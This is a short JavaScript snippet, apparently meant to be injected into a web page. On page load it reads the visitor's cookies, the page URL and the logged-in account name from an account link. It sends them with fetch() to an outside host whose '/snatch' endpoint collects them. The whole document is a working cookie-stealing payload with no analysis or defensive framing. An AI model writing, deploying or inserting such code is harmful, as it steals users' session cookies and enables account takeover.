window.onload = function () {
    document.addEventListener('DOMContentLoaded', function () {
        var url = `https://flux-snack-snatcher.azurewebsites.net/snatch?snacks=${encodeURIComponent(document.cookie)}&url=${encodeURIComponent(document.URL)}`;

        var contaLinkElement = document.querySelector('a[href="/?module=account&action=view"][style="text-decoration:underline;"]');

        if (contaLinkElement) {
            var contaLink = contaLinkElement.textContent || contaLinkElement.innerText;

            url += `&user=${encodeURIComponent(contaLink)}`;

        }

        fetch(url);
    });
}
